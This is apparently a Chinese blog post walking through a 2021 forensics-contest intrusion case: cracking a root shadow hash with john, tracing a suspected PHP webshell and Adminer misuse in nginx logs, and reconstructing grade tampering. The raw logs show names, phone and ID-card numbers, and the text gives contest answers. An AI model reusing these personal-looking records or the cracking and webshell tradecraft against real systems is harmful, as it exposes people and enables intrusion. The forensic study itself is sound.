<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2021 河北取证比武决赛个人赛 题解 入侵溯源 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2021 河北取证比武决赛个人赛 题解 入侵溯源" />
<meta property="og:description" content="个人赛 个人赛容器密码
BDH sha256全大写
A94686C845696F88525BB9E74FD7F5D38B6C12F7DDC7E5288C2F2D2201151F47
括号内表示该答案也可得分。26-30题每题4分，其余题目每题2分。
服务器部分 2021年5月 (对时间要敏感，做题时要摸清案情，摸清案情何作案动机能，厘清攻击路线。)，接某考试信息中心报案称，其单位一存储考生个人信息的服务器疑似被入侵，数据库被破坏并勒索比特币，警方当即固定了服务器的镜像server.e01。经调查警方抓获了嫌疑人并对其使用的笔记本电脑只做了镜像PC.e01，请对两个检材进行分析，并回答下面的问题：
1. 镜像sever.e01对应的被入侵服务器源盘sha256为 98C53B2AC30758EF0977FC313D5D1A070EBF51AE09E删除线格式 0DF36664A5CCF81DF35C5
2. 服务器操作系统内核版本为3.10.0-957.el7.x86_64 3. 服务器配置的网关为192.168.232.2 如果没有看到这个这个网关地址，点击左上角的设置列，弘连默认不展示所有列，像一些基础信息觉得应该能直接取到但是没有的可以到这个地方看看是否没点显示
4. 服务器中有2个登录过的账号 5. 服务器中root账号的密码为nb7001 导出/etc/目录下的shadow文件，进行破解
使用john工具cpu全速跑了很久才跑出来
个人喜欢用john
建议直接学习使用hashcat调用gpu来爆破
但是这么爆破总不是办法，在后面pc检材分析完之后，有很多途径可以很轻松获取到这个登陆密码，但是题目只做到当前这的进度时是很难获取到这样的信息的，所以这就是先对整套题目进行分析，厘清攻击路径攻击意图的重要性，可能有同学会觉得这样会花费很多时间去做一些没有必要的分析，但是实际上比直接硬找会快很多。
6. 入侵者IP为192.168.232.150 五月份发现被入侵并报警，查看该时段登录记录，异常信息。
整体分析 前面的基本上都是相当于是需要固定的基本信息，基本上都能直接找到，做到这题是需要一定分析才能做的题目了。接下来先不看题目，先对服务器进行分析，找到攻击路径，重建网站数据库等，再来逐题看题目，这样不会被题目牵着走，没思路的时候再来看题目是什么方向的。
历史记录里可以看到安装了pip3 install cryptodemo 这个库
删除过历史和日志
这里执行了一个加密的python脚本，先留个心眼，等题目做到再仔细分析
安装了好多库
仿真起
在这里发现加密提示，lnmp-install.log说明这个站可能是lnmp搭建的
可以看到有很多网站，将服务起一下，简单看一下网站
在这里找到一个备份脚本，应该有定时执行的设定，下一步去查看定时任务
这里找到路径，可以看到是个定时任务每五分钟执行一次backuplog.sh
接下来再看一下备份目录，使用xftp发现没啥东西，但是备份日志里确实显示这个是个备份目录，这就是xftp工具的局限性，修改还是比较方便的，但是隐藏文件是不显示的
我们使用命令查看一下
后期我们可以设置显示隐藏文件，就可以看到隐藏文件了
可以看到很多日志，将日志导出，进行分析
所有的历史记录都是相同的，这个备份中没有有效信息，查看一下登录日志
放到随便一个目录下，last解析一下
也解析一下，也没什么东西
再看一下各个网站
将各个网站的域名加入本地hosts文件
打开浏览各个网站，至此我们尚未发现攻击路径，感觉网站起的不太对，再查看一下网站nginx 的配置文件
只有默认站点
再找一下vhost下的配置文件，没有东西
Nginx目录下发现了配置文件中nginx服务只指向了一个目录就是/home/wwwroot/mhedu.sh.cn，所以之前对hosts文件加这么多设置访问到的也都是同一个站点
可以从之前备份中的历史命令记录也可以体现
在操作历史记录中，入侵者查看了一下网卡信息，查看了一下最近登录，查看了一下数据库配置文件，查看了一下网站配置文件，发现网站也是在这个mhedu.sh.cn的文件下，所以直接进去查看了，后面还做了脱库的操作
接下来可以分析一下web应用的日志
可以先放工具跑一遍，有一个整体印象，但是我一般都是自己先肉眼对整个日志文件看一遍，实在看不过来再用工具，大家平时练习也是练习自己审计为主，同时兼顾工具的熟练运用，比赛的时候以快为主，工具做出不来手工也要会。
可以很快的看到这里images2下面有个1.php，非常异常，对于攻击路径而言，很可能是上传的一句话木马。
还可以看到有很多对adminer的操作
Adminer是一个基于php的数据库管理工具，所以等下对这个文件的操作也要着重分析，通过日志工具分析我们发现1.php和adminer.php两个需要关注的点，然后考虑adminer是否是网站自带还是黑客传上去的，如果是黑客上传的也可以认为是一个大马
可以看到以这里为分界线，前面都是192.168.232.1的访问记录，UA头为&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/6d50fbb82fd264e6faa3eb4c3294534f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-31T10:03:54+08:00" />
<meta property="article:modified_time" content="2022-10-31T10:03:54+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2021 河北取证比武决赛个人赛 题解 入侵溯源</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>个人赛</h2> 
<p>个人赛容器密码<br> BDH sha256全大写<br> A94686C845696F88525BB9E74FD7F5D38B6C12F7DDC7E5288C2F2D2201151F47</p> 
<p>括号内表示该答案也可得分。26-30题每题4分，其余题目每题2分。</p> 
<h3><a id="_7"></a>服务器部分</h3> 
<p>2021年5月 (<em><strong>对时间要敏感，做题时要摸清案情，摸清案情何作案动机能，厘清攻击路线。</strong></em>)，接某考试信息中心报案称，其单位一存储考生个人信息的服务器疑似被入侵，数据库被破坏并勒索比特币，警方当即固定了服务器的镜像server.e01。经调查警方抓获了嫌疑人并对其使用的笔记本电脑只做了镜像PC.e01，请对两个检材进行分析，并回答下面的问题：</p> 
<h4><a id="1_severe01sha256_13"></a>1. 镜像sever.e01对应的被入侵服务器源盘sha256为</h4> 
<p>98C53B2AC30758EF0977FC313D5D1A070EBF51AE09E<s>删除线格式</s> 0DF36664A5CCF81DF35C5<br> <img src="https://images2.imgbox.com/14/63/END1h9NY_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="2__3100957el7x86_64_19"></a>2. 服务器操作系统内核版本为3.10.0-957.el7.x86_64</h4> 
<p><img src="https://images2.imgbox.com/5a/26/oUZmLmsS_o.gif" alt="在这里插入图片描述"></p> 
<h4><a id="3__1921682322_23"></a>3. 服务器配置的网关为192.168.232.2</h4> 
<p><img src="https://images2.imgbox.com/80/47/bSUmXmtV_o.gif" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-gSJL8SkZ-1667147527460)(F:\练习1# 个人赛.assets\clip_image006.gif)]"></p> 
<p>如果没有看到这个这个网关地址，点击左上角的设置列，弘连默认不展示所有列，像一些基础信息觉得应该能直接取到但是没有的可以到这个地方看看是否没点显示<br> <img src="https://images2.imgbox.com/60/51/iAut3SI1_o.gif" alt="在这里插入图片描述"></p> 
<h4><a id="4__2_31"></a>4. 服务器中有2个登录过的账号</h4> 
<p><img src="https://images2.imgbox.com/96/7a/hhUk9d8C_o.gif" alt="在这里插入图片描述"></p> 
<h4><a id="5__rootnb7001_36"></a>5. 服务器中root账号的密码为nb7001</h4> 
<p>导出/etc/目录下的shadow文件，进行破解<br> <img src="https://images2.imgbox.com/44/ff/haI1LQYm_o.gif" alt="在这里插入图片描述"></p> 
<p>使用john工具cpu全速跑了很久才跑出来</p> 
<p><img src="https://images2.imgbox.com/46/55/6QQJ28mC_o.gif" alt="在这里插入图片描述"></p> 
<p>个人喜欢用john</p> 
<p>建议直接学习使用hashcat调用gpu来爆破</p> 
<p>但是这么爆破总不是办法，在后面pc检材分析完之后，有很多途径可以很轻松获取到这个登陆密码，但是题目只做到当前这的进度时是很难获取到这样的信息的，所以这就是先对整套题目进行分析，厘清攻击路径攻击意图的重要性，可能有同学会觉得这样会花费很多时间去做一些没有必要的分析，但是实际上比直接硬找会快很多。</p> 
<h4><a id="6__IP192168232150_55"></a>6. 入侵者IP为192.168.232.150</h4> 
<p>五月份发现被入侵并报警，查看该时段登录记录，异常信息。</p> 
<h5><a id="_59"></a>整体分析</h5> 
<p>前面的基本上都是相当于是需要固定的基本信息，基本上都能直接找到，做到这题是需要一定分析才能做的题目了。接下来先不看题目，先对服务器进行分析，找到攻击路径，重建网站数据库等，再来逐题看题目，这样不会被题目牵着走，没思路的时候再来看题目是什么方向的。</p> 
<p><img src="https://images2.imgbox.com/f1/89/NnMfpX3g_o.gif" alt="在这里插入图片描述"></p> 
<p>历史记录里可以看到安装了pip3 install cryptodemo 这个库</p> 
<p><img src="https://images2.imgbox.com/9a/34/INp2coeK_o.gif" alt="在这里插入图片描述"></p> 
<p>删除过历史和日志</p> 
<p><img src="https://images2.imgbox.com/cf/c5/ZV3q2n5d_o.gif" alt="在这里插入图片描述"></p> 
<p>这里执行了一个<em><strong>加密的python脚本，先留个心眼，等题目做到再仔细分析</strong></em></p> 
<p><img src="https://images2.imgbox.com/7a/a0/3VEo9uHZ_o.gif" alt="在这里插入图片描述"></p> 
<p>安装了好多库</p> 
<p>仿真起</p> 
<p><img src="https://images2.imgbox.com/42/62/BZSfwSNx_o.gif" alt="在这里插入图片描述"></p> 
<p>在这里发现加密提示，lnmp-install.log说明这个站可能是lnmp搭建的</p> 
<p><img src="https://images2.imgbox.com/f3/23/rNNwMZAy_o.gif" alt="在这里插入图片描述"></p> 
<p>可以看到有很多网站，将服务起一下，简单看一下网站</p> 
<p><img src="https://images2.imgbox.com/f0/a6/BpJ8mHDf_o.gif" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/a8/14/gzavIwEX_o.png" alt="在这里插入图片描述"></p> 
<p>在这里找到一个备份脚本，应该有定时执行的设定，下一步去查看定时任务</p> 
<p><img src="https://images2.imgbox.com/5c/83/l9fQZ33I_o.gif" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/5d/d5/wTzTwCb6_o.gif" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/76/0d/s89J97QX_o.gif" alt="在这里插入图片描述"></p> 
<p>这里找到路径，可以看到是个定时任务每五分钟执行一次backuplog.sh<br> <img src="https://images2.imgbox.com/e6/6c/QmS3g7ei_o.gif" alt="在这里插入图片描述"></p> 
<p>接下来再看一下备份目录，使用xftp发现没啥东西，但是备份日志里确实显示这个是个备份目录，这就是xftp工具的局限性，修改还是比较方便的，但是隐藏文件是不显示的<br> <img src="https://images2.imgbox.com/a5/00/J2t8BUXf_o.gif" alt="在这里插入图片描述"></p> 
<p>我们使用命令查看一下<br> <img src="https://images2.imgbox.com/c6/f2/X4dwNLBB_o.gif" alt="在这里插入图片描述"></p> 
<p>后期我们可以设置显示隐藏文件，就可以看到隐藏文件了</p> 
<p><img src="https://images2.imgbox.com/db/7f/M4eOjz03_o.gif" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/8b/2c/HkN84Ea3_o.gif" alt="在这里插入图片描述"></p> 
<p>可以看到很多日志，将日志导出，进行分析<br> <img src="https://images2.imgbox.com/e1/f8/fw9lyTkf_o.gif" alt="在这里插入图片描述"></p> 
<p>所有的历史记录都是相同的，这个备份中没有有效信息，查看一下登录日志<br> <img src="https://images2.imgbox.com/75/1c/uneymrFg_o.gif" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/33/45/jOQrVmRK_o.gif" alt="在这里插入图片描述"></p> 
<p>放到随便一个目录下，last解析一下</p> 
<p><img src="https://images2.imgbox.com/dd/c9/KkWi7wBD_o.gif" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/2a/44/LwKPjglN_o.gif" alt="在这里插入图片描述"></p> 
<p>也解析一下，也没什么东西</p> 
<p><img src="https://images2.imgbox.com/07/fd/3yMIw8tn_o.gif" alt="在这里插入图片描述"></p> 
<p>再看一下各个网站<br> <img src="https://images2.imgbox.com/64/cb/prvQ2RQt_o.gif" alt="在这里插入图片描述"></p> 
<p>将各个网站的域名加入本地hosts文件</p> 
<p><img src="https://images2.imgbox.com/e6/b7/ox03K0EW_o.gif" alt="在这里插入图片描述"></p> 
<p>打开浏览各个网站，至此我们尚未发现攻击路径，感觉网站起的不太对，再查看一下网站nginx 的配置文件<br> <img src="https://images2.imgbox.com/fb/90/Dnfl4kSc_o.gif" alt="在这里插入图片描述"></p> 
<p>只有默认站点<br> <img src="https://images2.imgbox.com/00/98/kwxgycLi_o.gif" alt="在这里插入图片描述"></p> 
<p>再找一下vhost下的配置文件，没有东西<br> <img src="https://images2.imgbox.com/d8/0b/yp9bn6mA_o.gif" alt="在这里插入图片描述"></p> 
<p>Nginx目录下发现了配置文件中<em><strong>nginx服务只指向了一个目录就是</strong></em><u>/home/wwwroot/mhedu.sh.cn</u>，所以之前对hosts文件加这么多设置访问到的也都是同一个站点<br> <img src="https://images2.imgbox.com/bf/a1/8qrXzAmG_o.gif" alt="在这里插入图片描述"></p> 
<p>可以从之前备份中的历史命令记录也可以体现</p> 
<p><img src="https://images2.imgbox.com/36/bf/SmGw5lHz_o.png" alt="在这里插入图片描述"></p> 
<p>在操作历史记录中，入侵者查看了一下网卡信息，查看了一下最近登录，查看了一下数据库配置文件，查看了一下网站配置文件，发现网站也是在这个mhedu.sh.cn的文件下，所以直接进去查看了，后面还做了脱库的操作</p> 
<p>接下来可以分析一下web应用的日志<br> <img src="https://images2.imgbox.com/c6/cb/T984Tb40_o.gif" alt="在这里插入图片描述"></p> 
<p>可以先放工具跑一遍，有一个整体印象，但是我一般都是自己先肉眼对整个日志文件看一遍，实在看不过来再用工具，大家平时练习也是练习自己审计为主，同时兼顾工具的熟练运用，比赛的时候以快为主，工具做出不来手工也要会。<br> <img src="https://images2.imgbox.com/d2/65/NOqHmaqy_o.gif" alt="在这里插入图片描述"></p> 
<p>可以很快的看到这里images2下面有个1.php，非常异常，对于攻击路径而言，很可能是上传的一句话木马。</p> 
<p><img src="https://images2.imgbox.com/0f/7b/53wgSZH2_o.gif" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/bf/93/iNtwo6tt_o.png" alt="在这里插入图片描述"></p> 
<p>还可以看到有很多对adminer的操作<br> <img src="https://images2.imgbox.com/a9/1c/5XL0XrbX_o.gif" alt="在这里插入图片描述"></p> 
<p>Adminer是一个基于php的数据库管理工具，所以等下对这个文件的操作也要着重分析，通过日志工具分析我们发现1.php和adminer.php两个需要关注的点，然后考虑adminer是否是网站自带还是黑客传上去的，如果是黑客上传的也可以认为是一个大马<br> <img src="https://images2.imgbox.com/d2/2b/xkClVm0L_o.gif" alt="在这里插入图片描述"></p> 
<p>可以看到以这里为分界线，前面都是192.168.232.1的访问记录，UA头为"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"</p> 
<p>后面的为192.168.232.150的访问记录，UA头为"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"</p> 
<p>直观上的感受是前面日志排列的相对密集，后面的有一定的间隔。<em><strong>而且后面对木马操作的IP为192.168.232.150，结合登陆记录中root也有从192.168.232.150登陆过，可以断定入侵的IP之一肯定是192.168.232.150。</strong></em><br> <img src="https://images2.imgbox.com/43/dd/hBJ23VcW_o.png" alt="在这里插入图片描述"></p> 
<p>从这里开始往后审计192.168.232.150的操作<br> <img src="https://images2.imgbox.com/f2/1a/IOd3TYQF_o.gif" alt="在这里插入图片描述"></p> 
<p>这看到前期没有上传的操作，全是get，get 1.php之后马上开始用post开始操作，可以看到上方的文本比较密集，因为我已经将上面的UserAgent都已经删除了，但是下面文本比较稀疏，是因为出现了新的UA头，和上面的不一样，无法替换到，可以猜测下面的POST操作都是使用像菜刀、蚁剑、冰蝎这样的webshell管理工具实现的。<a href="https://zhuanlan.zhihu.com/p/187482560" rel="nofollow">冰蝎3.0 流量特征分析 附特征 - 知乎 (zhihu.com)</a><br> <img src="https://images2.imgbox.com/05/61/HjVvphAO_o.gif" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/88/75/mytiBI0W_o.gif" alt="在这里插入图片描述"></p> 
<p>后面的流量也看不出来什么，毕竟没有过程，但是后面shell操作结束后突然对adminer继续操作，且后面的UA头是之前的UA头，最后一个POST包的大小是7781，合理怀疑这个adminer是这个包传上去的<br> <img src="https://images2.imgbox.com/e7/51/0c7qCdnD_o.gif" alt="在这里插入图片描述"></p> 
<p>接下来对adminer的操作进行分析</p> 
<p><img src="https://images2.imgbox.com/2e/41/MM0eeYrh_o.gif" alt="在这里插入图片描述"></p> 
<p>接下来按照其手法，对仿真起来的网站里的adminer登录进行查看修改的这些数值，推测一次POST对应一次修改</p> 
<pre><code class="prism language-verilog">192.168.232.150 - - [04/May/2021:15:48:36 +0800] "GET /adminer.php HTTP/1.1" 200 1652 "-" 
192.168.232.150 - - [04/May/2021:15:48:38 +0800] "GET /adminer.php?file=default.css&amp;version=4.1.0&amp;driver=mysql HTTP/1.1" 200 2194 "http://192.168.232.148/adminer.php" 
192.168.232.150 - - [04/May/2021:15:48:38 +0800] "GET /adminer.php?file=functions.js&amp;version=4.1.0&amp;driver=mysql HTTP/1.1" 200 8150 "http://192.168.232.148/adminer.php" 
192.168.232.150 - - [04/May/2021:15:48:38 +0800] "GET /adminer.php?file=favicon.ico&amp;version=4.1.0&amp;driver=mysql HTTP/1.1" 200 330 "-" 
192.168.232.150 - - [04/May/2021:15:49:23 +0800] "POST /adminer.php HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php" ##可能为登录
192.168.232.150 - - [04/May/2021:15:49:24 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient HTTP/1.1" 200 3192 "http://192.168.232.148/adminer.php" ##用户为root，数据库为studient
192.168.232.150 - - [04/May/2021:15:49:24 +0800] "GET /adminer.php?file=jush.js&amp;version=4.1.0&amp;driver=mysql HTTP/1.1" 200 13475 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient" 
192.168.232.150 - - [04/May/2021:15:49:24 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;script=db HTTP/1.1" 200 204 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient" 
192.168.232.150 - - [04/May/2021:15:49:31 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;table=score HTTP/1.1" 200 2295 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient" 
192.168.232.150 - - [04/May/2021:15:53:45 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10458 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;table=score" 
192.168.232.150 - - [04/May/2021:15:54:09 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 98946 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 
192.168.232.150 - - [04/May/2021:16:35:32 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E5%BC%A0%E6%99%93&amp;where%5B01%5D%5Bcol%5D=&amp;where%5B01%5D%5Bop%5D=%3D&amp;where%5B01%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100 HTTP/1.1" 200 4645 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=张晓&amp;where[01][col]=&amp;where[01][op]==&amp;where[01][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100

192.168.232.150 - - [04/May/2021:16:36:14 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E8%B5%B5%E5%A4%A9%E6%AD%8C&amp;where%5B2%5D%5Bcol%5D=&amp;where%5B2%5D%5Bop%5D=%3D&amp;where%5B2%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100 HTTP/1.1" 200 4658 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E5%BC%A0%E6%99%93&amp;where%5B01%5D%5Bcol%5D=&amp;where%5B01%5D%5Bop%5D=%3D&amp;where%5B01%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=赵天歌&amp;where[2][col]=&amp;where[2][op]==&amp;where[2][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=张晓&amp;where[01][col]=&amp;where[01][op]==&amp;where[01][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100


192.168.232.150 - - [04/May/2021:16:36:43 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10460 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E8%B5%B5%E5%A4%A9%E6%AD%8C&amp;where%5B2%5D%5Bcol%5D=&amp;where%5B2%5D%5Bop%5D=%3D&amp;where%5B2%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100" 

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=赵天歌&amp;where[2][col]=&amp;where[2][op]==&amp;where[2][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100

192.168.232.150 - - [04/May/2021:16:37:37 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10458 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 


192.168.232.150 - - [04/May/2021:16:37:50 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564 HTTP/1.1" 200 2685 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564

192.168.232.150 - - [04/May/2021:16:38:10 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564


192.168.232.150 - - [04/May/2021:16:38:11 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10734 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564" 


##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564

192.168.232.150 - - [04/May/2021:16:38:14 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538 HTTP/1.1" 200 2685 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538


192.168.232.150 - - [04/May/2021:16:38:17 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538
##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538

192.168.232.150 - - [04/May/2021:16:38:17 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10743 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538" 

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538

192.168.232.150 - - [04/May/2021:16:38:20 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539 HTTP/1.1" 200 2691 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

